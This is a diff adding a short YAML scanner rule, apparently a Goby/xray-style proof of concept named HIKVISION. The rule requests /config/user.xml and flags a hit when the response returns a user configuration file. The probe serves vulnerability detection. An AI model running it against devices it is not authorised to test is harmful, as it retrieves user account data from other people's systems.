@@ -1,0 +1,19 @@
+name: HIKVISION
+transport: http
+set: {}
+detail:
+  dock: body="easyui/themes/particular_blue.css"
+  product: ''
+  homepage: https://gobies.org/
+  impact: ''
+  description: ''
+rules:
+  r1:
+    method: GET
+    path: /config/user.xml
+    follow_redirects: true
+    headers:
+      User-Agent: Mozilla/5.0(X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0
+      Accept: test/html,application/xhtml+xml,application/x  ml;q=0.9,*/*;q=0.8
+    expression: response.status == 200 && response.body.bcontains(b'name')
+expression: r1()
